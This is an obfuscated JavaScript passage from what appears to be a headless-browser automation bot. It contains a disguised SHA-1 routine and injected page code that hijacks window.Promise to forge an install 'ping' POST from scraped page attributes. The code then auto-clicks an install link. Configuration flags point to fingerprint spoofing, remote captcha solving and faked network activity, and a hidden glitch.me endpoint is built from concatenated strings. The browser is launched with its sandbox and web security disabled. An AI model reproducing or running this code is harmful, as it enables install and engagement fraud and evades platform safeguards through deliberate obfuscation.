(-0x1 * 0x1137 + 0x2 * -0x10b1 + 0x3389 | L >> 0x439 * 0x1 + -0x1ccc + 0x2bd * 0x9) << y[0x1 * -0x1154 + -0xe53 + 0x1faa & N++], P[N >> 0x788 + -0x35b * -0x1 + -0xae1] |= (0x6ad * -0x2 + 0x1c16 + 0x1 * -0xe3c | L >> -0x148b * -0x1 + 0x2a9 * 0x1 + -0x1728 & 0x1d3b + -0x1a5f + -0x29d) << y[-0x1a8 * 0x7 + 0x18f4 + -0xd59 & N++], P[N >> -0x1 * 0x1bf7 + -0x8 * 0x184 + 0x805 * 0x5] |= (-0x1 * -0x43 + 0x8b * 0xb + 0x1 * -0x5bc | L >> 0x2183 * 0x1 + -0x1429 + -0xd54 & -0xd83 * 0x1 + -0x1 * 0x109d + 0x1e5f) << y[-0xb * -0x289 + -0xfd7 + 0x27 * -0x4f & N++], P[N >> -0x1 * 0x1efb + -0x86 * -0xd + 0x29 * 0x97] |= (0x161b * 0x1 + -0x120a + -0x391 | 0x9 * 0x68 + 0xa1f * -0x1 + -0x6b6 * -0x1 & L) << y[0x1a3e + -0x89 * 0x15 + 0x13 * -0xca & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x5bb * 0x1 + 0x1 * -0xa1d + -0x4 * -0x406 ? (this['block'] = P[0x42a + -0x1c07 + -0x5 * -0x4c9], this['start'] = N - (-0xe23 + 0x1 * -0x601 + -0x91 * -0x24), this['hash'](), this['hashed'] = 0x1 * -0x18d + -0x9fa + 0xb88) : this['start'] = N;
                }
                return this['bytes'] > 0x109141163 + 0x76cf264 + -0x108103c8 && (this['hBytes'] += this['bytes'] / (0x2 * 0x6ac7cd7a + -0x157935a9c + 0x18203bfa8) << 0x1ce * 0xd + -0x19 * 0x131 + 0x1 * 0x653, this['bytes'] = this['bytes'] % (-0x88d * -0x239158 + 0xc4a438f4 + -0xf4c6066c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2c7 + -0xce * -0x1 + -0x394;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x10eb + -0x560 + 0x165b] = this['block'], J[K >> 0x1e * -0x97 + 0x12d * 0x8 + -0x24 * -0x3b] |= x[0x3f0 + 0x4c + -0x439 & K], this['block'] = J[0x2 * -0x6c4 + -0xfd2 + 0x5 * 0x5e2], K >= 0xd2b + -0x1655 * 0x1 + 0x962 && (this['hashed'] || this['hash'](), J[-0x19db * -0x1 + -0xc13 + -0xdc8] = this['block'], J[0x8d1 + 0x54f + -0xe10] = J[-0x1c38 + 0x3b8 + 0x1881] = J[0x1db7 + -0xc * 0x55 + 0x525 * -0x5] = J[0xd07 + -0x3df * -0x3 + -0x18a1] = J[0x20b5 + 0x2256 + 0x4307 * -0x1] = J[-0x502 * -0x7 + 0xaca + -0x1 * 0x2dd3] = J[-0xb4b + 0x9 * 0x295 + -0x2 * 0x5f6] = J[0xe50 * 0x2 + 0x4 * 0x52 + -0x1de1] = J[-0x154c + -0x16ae + -0x56 * -0x83] = J[0x1dcf * 0x1 + -0x20ff + 0x339] = J[-0x875 + -0x26c3 + 0x17 * 0x20e] = J[-0x45b * -0x4 + -0x775 + 0x1fc * -0x5] = J[0x21d3 + -0x1 * -0x10fe + -0x1 * 0x32c5] = J[0xb4 + -0x24b9 + -0x1209 * -0x2] = J[-0xbce + -0xa0d + 0x15e9] = J[0x87 + -0x1 * -0x1e44 + 0x1ebc * -0x1] = 0x1ac2 * 0x1 + 0xa48 + 0xb * -0x35e), J[-0x1baf + 0x145b * 0x1 + 0x762] = this['hBytes'] << -0x303 + -0x3 * 0x55e + 0x1320 | this['bytes'] >>> 0x47b * -0x1 + -0x23c3 * -0x1 + -0x65 * 0x4f, J[0x1 * 0xc94 + 0x3 * -0x1c2 + -0x35 * 0x23] = this['bytes'] << 0x15 * 0x191 + -0x12a0 + 0x92 * -0x19, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1fb + 0x1c2a + 0x1a1f * -0x1; J < 0x154 * 0x18 + 0x1338 + -0x32c8; ++J)
                K = Q[J - (0x2c1 + -0x1b * -0x105 + -0x7b * 0x3f)] ^ Q[J - (-0x75b * 0x5 + -0x19e3 + 0x645 * 0xa)] ^ Q[J - (0x1105 + -0x1 * -0xafd + 0xdfa * -0x2)] ^ Q[J - (-0xec4 + 0x337 * 0xa + 0x8a9 * -0x2)], Q[J] = K << 0x1074 + 0x404 * -0x5 + 0x3a1 | K >>> -0x1 * -0x2209 + -0x2386 + 0x1 * 0x19c;
              for (J = 0x1fc8 + 0x1 * 0x2273 + -0x423b; J < 0x1 * -0x7f1 + -0x1fbd + -0x1 * -0x27c2; J += 0x1 * -0x1d15 + -0xc11 + 0x292b)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4d * 0x67 + 0x27 * 0x57 + 0x31 * -0xe7 | L >>> 0x1a3f * 0x1 + -0x1ff4 + 0xba * 0x8) + (M & N | ~M & O) + P + (-0x9e465e2d * -0x1 + 0xd5d * 0x9bdc2 + -0xc5f0ae0e) + Q[J] << -0x201e * -0x1 + 0x43b * 0x7 + 0x3dbb * -0x1) << 0x62 * -0x3b + 0x1789 + 0xee * -0x1 | P >>> 0x1 * -0x1861 + 0x191d + -0xa1) + (L & (M = M << -0xe9b + -0x17d * -0xd + -0x4a0 | M >>> -0x4a * 0x1f + -0x17 * -0x97 + -0x6b * 0xb) | ~L & N) + O + (0x71e55c9d + -0x528ca290 + 0x1d94dfc6 * 0x2) + Q[J + (0x1bba + 0x246b * 0x1 + -0x4024)] << -0xbcf * -0x1 + -0x11b * -0x13 + -0x20d0) << -0x666 + -0x571 + 0xbdc | O >>> 0x161 * 0x17 + 0x1bfa + -0x3b96) + (P & (L = L << 0x1 * 0xfcf + -0x661 + 0x8 * -0x12a | L >>> 0x2 * 0x38f + 0x1418 * 0x1 + -0x1b34) | ~P & M) + N + (-0x872e3b23 + 0x1 * 0x73faa6b3 + 0x6db60e09 * 0x1) + Q[J + (-0x93a * 0x1 + 0x9b * -0x1d + 0x1acb)] << -0x6 * -0xc4 + 0x2471 + -0x37 * 0xbf) << 0xc2d + -0xc92 + 0x6a | N >>> 0x1935 + -0x2ea * -0x8 + 0x1835 * -0x2) + (O & (P = P << -0x2 * 0x81e + 0xe1 * -0x2 + 0x121c | P >>> 0x3 * -0x359 + -0x1ceb * 0x1 + 0x4 * 0x9be) | ~O & L) + M + (-0x8aa5ebe9 + 0x7b911ca3 + 0x319f * 0x220c1) + Q[J + (-0x2376 + -0x5 * -0x781 + -0x20c)] << -0x62e + -0x21cc + -0x12d * -0x22) << -0x2 * 0x9b1 + -0x31 * -0x83 + -0x5ac | M >>> 0x12aa + -0x1c2a + -0x1 * -0x99b) + (N & (O = O << -0x1 * 0x868 + 0x5b8 + -0x1 * -0x2ce | O >>> -0x126d + 0x7 * 0x13d + 0x9c4) | ~N & P) + L + (-0x4531f70d + -0x16ba * -0x1e40c + -0x9c7592 * -0xbf) + Q[J + (0x133b + 0x8b2 + -0x1 * 0x1be9)] << 0x1841 + -0x1e6c + 0x62b, N = N << -0x8a9 + -0x5df + 0x32 * 0x4b | N >>> 0x1 * -0x42d + 0x1fb5 * -0x1 + 0x23e4;
              for (; J < -0x2bb + -0xd2c + -0x100f * -0x1; J += -0x11b9 + 0x80a + 0x9b4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x7 * -0x124 + 0x1dc6 + -0x15c5 | L >>> 0x21f4 * -0x1 + -0x125e + -0x346d * -0x1) + (M ^ N ^ O) + P + (-0x532a6d46 + -0x5d5d00cd + -0x4 * -0x47d8566d) + Q[J] << 0x5 * -0x5c6 + 0xa40 * -0x2 + -0x47 * -0xb2) << -0x1149 + 0x2225 + -0x3 * 0x59d | P >>> -0xd * -0x24f + -0x7b2 + -0x2 * 0xb1b) + (L ^ (M = M << 0xb * 0x2e + 0x1d * -0x69 + 0xa09 | M >>> 0x9c * -0x35 + 0x23e9 + -0x39b) ^ N) + O + (-0x1a66545a + 0xec19d42 + 0x187fba25 * 0x5) + Q[J + (0xe3b + 0x115f + -0x1f99)] << -0xba9 + -0x1ccc + -0x1 * -0x2875) << 0xe00 + -0x17e * -0x6 + -0x7a5 * 0x3 | O >>> -0xb4b + 0x2c2 * 0x1 + 0x8a4) + (P ^ (L = L << 0x1d35 * -0x1 + -0x5 * -0x3b + 0x1c2c | L >>> -0x19 * 0xdd + -0x2226 * 0x1 + 0x37bd) ^ M) + N + (0x60509740 + 0x3 * 0x2f55c2c7 + -0x2 * 0x3fbbf9fa) + Q[J + (-0x1c34 + 0x174f + 0xfb * 0x5)] << -0x223e + -0x1 * 0x178 + -0x7 * -0x51a) << -0x82f + 0x1113 + -0x8df | N >>> -0x16fa + 0x21d5 + -0xac0) + (O ^ (P = P << -0x11 * 0x139 + -0x22f2 + 0x37d9 | P >>> -0x1449 + 0x2 * 0x1044 + -0xc3d) ^ L) + M + (0x2a555cbf * -0x3 + 0x36c533ed * -0x3 + -0x11 * -0x17a81855) + Q[J + (-0x65b * -0x3 + -0x2341 + 0x179 * 0xb)] << -0x1 * 0x59f + -0x194e + 0x27 * 0xcb) << 0x4ef + -0x1668 + 0x8bf * 0x2 | M >>> 0x20d + 0x455 + -0x647) + (N ^ (O = O << -0xa0 * 0x9 + 0x4 * 0xd + 0x58a | O >>> 0x5e0 + -0x1618 + 0x103a) ^ P) + L + (0x2cd5504b * 0x2 + -0xa8f53497 * -0x1 + 0x1cec05 * -0x51c) + Q[J + (-0x1fd5 * -0x1 + -0x1f * 0xf5 + -0x226)] << 0x25 * 0x1 + -0x19e4 + 0x19bf, N = N << 0x61c * 0x5 + -0x19f * 0xa + -0xe38 | N >>> -0x1 * -0x105b + 0x4b1 * 0x6 + -0x1 * 0x2c7f;
              for (; J < 0x1965 + -0x1 * -0x16fc + -0x3025; J += -0x231c + -0xe4f + 0x3170)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x226e + -0xc5 + -0x8 * -0x467 | L >>> -0x1 * -0x1d16 + -0x4 * 0x1b + 0x3 * -0x985) + (M & N | M & O | N & O) + P - (0x3 * 0x1d80c647 + -0x8b4fbba0 + 0xa3b1abef) + Q[J] << 0x9f * -0x34 + -0x1c08 + 0x3c54) << -0x86 * 0x25 + 0x1 * 0x18d7 + -0x574 | P >>> -0xcc * -0x1a + -0x11 * 0x201 + -0x7 * -0x1ec) + (L & (M = M << 0x11cd + -0xbe1 + 0x1 * -0x5ce | M >>> 0x13a * 0xe + 0x1 * -0x1681 + 0x557) | L & N | M & N) + O - (0x19fad010 * 0x2 + -0xc988f78f + 0x106779a93) + Q[J + (-0x96c + 0x1e18 + -0x14ab)] << 0x3 * -0x869 + -0x1b8a + 0x34c5) << 0x2233 + -0x6 * -0xf2 + -0x27da | O >>> 0xfb7 * -0x1 + 0x25bd * 0x1 + -0x15eb) + (P & (L = L << 0x105a + -0xe2 * 0x2 + 0x1cf * -0x8 | L >>> 0x1297 + 0x1a9 + -0x143e * 0x1) | P & M | L & M) + N - (-0xd7ef6abb + 0x60c6311e + -0x1 * -0xe80d7cc1) + Q[J + (0x1 * -0x7e7 + 0x1 * 0x36f + -0x1 * -0x47a)] << -0x28 * 0xaa + 0x1bc5 + -0x135) << 0x36d + -0x1cd7 + 0x17f * 0x11 | N >>> 0x12a6 + -0x1f79 + 0xcee) + (O & (P = P << -0x100 * -0x24 + 0x1458 + -0x1c1d * 0x2 | P >>> 0x1180 + -0x1 * 0x5bd + 0x3eb * -0x3) | O & L | P & L) + M - (-0xc9cccdab + -0x9b4ed728 + 0x1d5ffe7f7) + Q[J + (-0x90f * 0x3 + 0x221 * 0x12 + -0x96 * 0x13)] << 0xd2e + 0x10a4 + -0x1dd2) << 0x4d5 * -0x7 + -0x26ac + 0x4884 | M >>> -0x1a59 + -0x2 * 0x10a3 + -0x1 * -0x3bba) + (N & (O = O << -0x2593 + -0xbb1 * -0x2 + 0xe4f | O >>> -0x8b9 + 0x1 * -0x6f7 + 0xfb2) | N & P | O & P) + L - (-0x3 * 0x17f23c52 + 0x3 * 0x17773efd + 0x72553b23) + Q[J + (-0x14cc + -0x1 * -0x25f + 0x1271)] << -0x240f + -0x1051 + -0x346 * -0x10, N = N << -0xbb9 + -0x3 * 0x759 + 0x2 * 0x10f1 | N >>> -0x2629 * 0x1 + -0x4bf + 0x2aea;
              for (; J < 0x2 * 0x488 + -0x16b + 0x755 * -0x1; J += -0x575 * 0x2 + -0xb5b + 0x164a)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5a6 + 0x180a + -0x125f | L >>> -0x113f * -0x2 + -0x81 * -0x18 + -0x2e7b) + (M ^ N ^ O) + P - (-0x2b6538d + -0x9c27949 + 0x42160b00) + Q[J] << 0x2679 + -0x1 * -0x1513 + 0x4a * -0xce) << -0x23 * -0x109 + 0x2398 * 0x1 + -0x47ce | P >>> -0x116 * -0x12 + -0x1f1 + -0x8c0 * 0x2) + (L ^ (M = M << -0x2 * 0x10c5 + 0xe * -0x98 + 0x29f8 | M >>> 0x234f + -0xe49 * 0x1 + -0x4 * 0x541) ^ N) + O - (0x137d023 + -0x244c5219 + 0xbc * 0x78c678) + Q[J + (-0x3f + -0x6b * 0xa + 0x6 * 0xbd)] << -0xb * -0x31a + -0x824 + 0xe * -0x1db) << -0x11 * 0xf8 + -0xab1 + 0xd97 * 0x2 | O >>> 0x1 * -0x647 + -0x1f1b + 0x1c9 * 0x15) + (P ^ (L = L << 0x234f + -0xf * -0x1ca + 0x3 * -0x14ad | L >>> 0x5ea * -0x1 + 0x1b * 0xb + -0x17 * -0x35) ^ M) + N - (-0x21abdc49 * -0x1 + -0x4ed8c6ab + 0x62ca288c) + Q[J + (-0x18 * 0x14 + -0xc62 + 0xa6 * 0x16)] << 0x1 * -0x14a4 + -0x8b2 + 0xa * 0x2ef) << 0xb8e + -0x14 * 0x104 + 0x3 * 0x2ed | N >>> -0xd3 + -0x1a17 + 0x1 * 0x1b05) + (O ^ (P = P << -0x1 * -0x175d + -0x15 * -0x11f + 0x1765 * -0x2 | P >>> -0x12e8 + 0xdf * -0x2c + 0x1c9f * 0x2) ^ L) + M - (0x2a2a8552 + -0x9cad9 * 0xa05 + -0x74de09b * -0xf) + Q[J + (0x1695 + 0x85 * -0x3e + -0x2 * -0x4d2)] << -0x23bc + -0x2 * 0xc2 + 0x2540) << -0xcb1 + 0x4e1 + -0x1 * -0x7d5 | M >>> 0x1c19 + 0xef7 * 0x2 + -0x39ec) + (N ^ (O = O << -0x20be + 0x4 * -0x55a + 0x3644 | O >>> -0x1310 + -0xe87 * 0x2 + -0x460 * -0xb) ^ P) + L - (0x216028db + 0x5c5e0b * 0xa3 + 0x2 * -0x134965d9) + Q[J + (0x4ff + 0xfc5 + -0x14c0)] << -0x1fb8 + 0x3b + -0x1 * -0x1f7d, N = N << -0x392 + 0x1 * -0x15ed + 0x199d * 0x1 | N >>> 0x8d3 + 0x2f2 + -0xbc3;
              this['h0'] = this['h0'] + L << -0x1409 + 0x2 * -0xa39 + 0x2b * 0xf1, this['h1'] = this['h1'] + M << -0x1a2e + -0x1 * -0x6fd + 0x1331 * 0x1, this['h2'] = this['h2'] + N << -0x1d1 + -0x45 * 0x43 + -0x60 * -0x35, this['h3'] = this['h3'] + O << 0x7a5 * 0x1 + 0x189f + -0x2044, this['h4'] = this['h4'] + P << -0x408 + -0x243 + 0x64b * 0x1;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xb6f * -0x1 + 0x145b * -0x1 + 0x908 & 0x2530 + 0x26d0 + -0x4bf1] + w[J >> 0x1f4e + 0x1094 + 0x17e5 * -0x2 & -0x10f6 + 0x20c5 + 0x24 * -0x70] + w[J >> 0x21 * -0x97 + -0xa61 * 0x3 + -0x3e6 * -0xd & 0x3 * 0x91d + 0x5d7 + -0x211f] + w[J >> -0xa35 + 0x6 * -0x3d + 0xbb3 & -0x3 * 0x179 + 0x23c7 + -0x1f4d] + w[J >> -0x5ca + 0x1eea + 0xc * -0x217 & 0xb * 0x337 + -0x1f * 0x6d + -0x161b] + w[J >> 0x1 * 0x19ee + -0x1 * 0x1110 + -0x46b * 0x2 & -0x5 * 0x646 + 0x22a1 + -0x334] + w[J >> -0x150 * -0x8 + -0x24f0 + 0x1a74 & 0x1 * -0x1c97 + 0xa3 + -0x65 * -0x47] + w[-0x36e * -0x7 + 0x1e6 + -0x1 * 0x19d9 & J] + w[K >> 0x26de + -0x49 * -0x2f + -0x3429 & 0x98e + 0x8c3 + -0x6 * 0x30b] + w[K >> 0x2480 + 0x16 * -0x29 + -0x20e2 & 0x110f + 0x20e3 + -0x1 * 0x31e3] + w[K >> -0xca0 + 0x19f3 * -0x1 + 0x1 * 0x26a7 & -0x4a * 0x18 + 0x93 * 0x2f + -0x13fe] + w[K >> -0xb12 + 0xa7 * -0x28 + 0x253a * 0x1 & 0x1e34 + 0xa6d * 0x1 + 0x6c3 * -0x6] + w[K >> 0x1 * -0xea0 + -0x1386 + 0x2232 & 0x9 * 0x137 + -0x2159 + 0x1679] + w[K >> -0x13d * 0x3 + -0xec4 + 0x1283 & -0x192b + 0x8 * -0xc9 + -0x25 * -0xda] + w[K >> -0xabd * 0x1 + -0x5a * 0x63 + 0x2d8f & -0x484 + 0x390 + -0x25 * -0x7] + w[0x706 + -0xa54 + 0x35d & K] + w[L >> -0xa5 * -0x4 + 0xffd * -0x1 + 0xd85 & -0x1ca2 + -0xf37 + 0x2be8] + w[L >> -0x28f * 0x5 + 0x12 * -0x14b + 0x1 * 0x2429 & -0x1 * 0xbb6 + 0x1 * -0x16f + 0xd34] + w[L >> 0x1 * -0x1f46 + -0x3 * 0x153 + 0x2353 * 0x1 & -0x7ad + -0xe02 + 0x15be] + w[L >> -0x1441 + 0xb * 0x17e + -0x3 * -0x14d & -0x24d * -0xd + -0x1 * -0x3c9 + -0x21a3] + w[L >> 0x1dde + 0x122c * -0x2 + -0xa * -0xa7 & -0xb * -0xa1 + -0x1 * -0x1b9c + -0x2278] + w[L >> 0x8 * -0x1c0 + 0xf21 + 0x1 * -0x119 & 0x9aa * 0x1 + -0x154a + 0xbaf] + w[L >> -0x2 * -0xb80 + -0x2690 + 0xf94 & 0xab * -0x19 + 0x5 * 0x1cd + 0x7c1] + w[0x11 * -0x1c9 + 0x2 * 0xf77 + -0x1 * 0x86 & L] + w[M >> 0x5e * 0x10 + 0x1a4 + -0x3b4 * 0x2 & -0x7 * 0x2ae + -0x6b * 0x16 + 0x1c03] + w[M >> 0x2a2 * 0x9 + 0x1c2c + -0x2f * 0x11a & -0x139 + 0x3f1 * 0x8 + -0x8 * 0x3c8] + w[M >> -0x2115 + 0x21c2 + -0x99 & -0x265f + 0x4 * -0xc8 + 0x14c7 * 0x2] + w[M >> 0x19f8 + 0x7 * 0x4ff + -0x3ce1 & 0x193f + -0x199d + 0x1 * 0x6d] + w[M >> -0x26b5 + 0x635 * -0x1 + 0xa * 0x47f & -0x1663 + -0x1 * -0x251 + -0x1 * -0x1421] + w[M >> -0x25cb + 0x2210 + 0x1 * 0x3c3 & -0x7ea + 0x2b9 * 0xd + -0xc3 * 0x24] + w[M >> -0xa64 + 0x5 * 0x561 + -0x107d & 0x232a + 0x710 + -0x2a2b] + w[-0x1a7c * 0x1 + -0x1 * 0x16d + 0x1bf8 & M] + w[N >> 0x4d0 + 0x40 * -0x73 + 0x180c & 0x6e * -0x2 + 0x25a0 + -0x1 * 0x24b5] + w[N >> 0x19 * 0xce + 0x4ea * 0x1 + -0x850 * 0x3 & 0x10a9 + 0x3cb * -0x1 + 0x3 * -0x445] + w[N >> 0x2 * 0x73d + 0x9a6 + -0xe4 * 0x1b & 0x2382 + -0x159 * -0x10 + -0x3903] + w[N >> -0x8b0 + -0x1 * -0x1d96 + -0x2 * 0xa6b & 0x10b1 * -0x1 + 0x221b * -0x1 + 0x32db * 0x1] + w[N >> -0x9c2 + -0x154a + 0x1f18 & -0x1553 + 0x63c + 0x7 * 0x22a] + w[N >> 0x1cf7 + 0x10ae + -0x2d9d & 0x20ad + -0x1f3e + -0x160] + w[N >> 0x83 * -0x27 + -0x8 * -0x205 + 0x1 * 0x3d1 & -0xb * -0x197 + -0x1bd + -0x135 * 0xd] + w[-0x3e7 * 0x1 + -0x1b3 * 0x13 + 0x243f & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1 * 0x281 + -0xcf0 + 0xa87 * 0x1 & 0x139 + -0x1f88 + -0x2 * -0xfa7,
                J >> 0x590 + -0x2611 + -0x7 * -0x4a7 & 0x2461 + -0xda + -0x22 * 0x104,
                J >> -0x75f + 0x95 * -0x30 + 0x2357 & 0xd16 + 0x3 * -0x70b + -0xd * -0xb2,
                0x1907 + -0x53e + -0x25 * 0x82 & J,
                K >> -0x1cee + -0x121f * -0x2 + -0x738 & -0xc96 * 0x2 + 0x7 * 0x15 + 0x38 * 0x75,
                K >> -0xee1 + 0x2 * -0xf5b + 0x2da7 & -0x19cb + -0x254a + -0xc * -0x557,
                K >> 0xcc0 + -0xddc + -0x92 * -0x2 & -0xbdb + -0x1707 + 0x23e1,
                0x2381 + -0x67d * 0x1 + -0x1c05 & K,
                L >> -0x259d + 0x11d3 + -0x1fd * -0xa & -0xf0b + 0x2263 + -0xb * 0x1ab,
                L >> -0x8 * -0x443 + 0x1d63 + -0x3f6b * 0x1 & -0x26af + 0x24f8 + -0x2 * -0x15b,
                L >> -0x97 * -0x29 + 0x60 * -0x56 + 0x819 & -0x1 * 0x117f + 0x47f + -0xdff * -0x1,
                0xb + -0x1c75 + 0x1d69 & L,
                M >> 0x3 * -0x85a + 0x21b5 + 0x88f * -0x1 & -0x9 * 0x289 + -0x1 * -0x23b7 + -0xbe7 * 0x1,
                M >> 0x754 * 0x1 + -0x8 * 0x26b + -0x2 * -0x60a & 0x1a94 + 0x178b + -0x3120,
                M >> 0x8ff * 0x2 + -0x32d + -0xec9 & 0x1f * -0x126 + -0x46 * -0x82 + 0x10d,
                0xfc8 + 0xe80 * 0x2 + 0x1 * -0x2bc9 & M,
                N >> -0x1294 + 0x1fb * -0x7 + 0x1 * 0x2089 & -0x8 * -0x2c8 + 0x35 * 0xa3 + 0x16 * -0x280,
                N >> 0x15d3 * 0x1 + 0x2275 * -0x1 + 0xcb2 & -0x6 * -0x540 + -0xf05 + -0x3df * 0x4,
                N >> -0x344 * 0x1 + -0x49 * -0x8 + -0x41 * -0x4 & -0xbf9 + -0x1146 + 0x1e3e,
                0x2323 + 0x2491 + 0x46b5 * -0x1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              const X = b;
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x12b4 + -0x19b1 * -0x1 + -0x2c51), (K = new DataView(J))[X(0x1a, 'MY^s')](-0x32e + 0x613 * 0x2 + 0x148 * -0x7, this['h0']), K['setUint32'](0x12ae + 0x10b * 0xe + -0x851 * 0x4, this['h1']), K['setUint32'](0x51b + 0x126e + -0x1781, this['h2']), K['setUint32'](0x1e * -0x55 + 0x469 + 0x599, this['h3']), K['setUint32'](0x5a3 + -0x1bb4 + 0x1621, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[-0x3ef * -0x3 + 0x251c + -0x30e9];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x205c + 0x1039 * -0x2 + 0x40ce;
            J[0x1 * 0x1807 + 0x8a1 * 0x2 + -0xd * 0x32d]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2f * -0xc5 + 0x1bd + 0x226e] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x13 * 0x166 + 0x4f2 * -0x2 + -0x10ad), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x1159 + -0x2612 * -0x1 + -0x14b8;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x244d + -0x19f + 0xaf2 * 0x4), Promise['resolve'](-0xbaf * 0x3 + -0x2 * 0xaf1 + -0x1c78 * -0x2);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0xfa2 + -0x456 * -0x7 + -0xeb8; j < 0x2 * 0x305 + 0x9 * 0x28d + -0x2 * 0xe7f; j++)
    i();
}
const NETWORK_PATIENCE = -0x442 + 0x731 * -0x8 + -0x2 * -0x2e85 + (0x752 + 0x4d * 0x59 + 0x165f * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * 0x2567 + -0x11d2 * -0x1 + -0x3736) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + Y(0xf) + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x1c14 + 0x4 * -0x46 + 0xe96 * 0x2; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
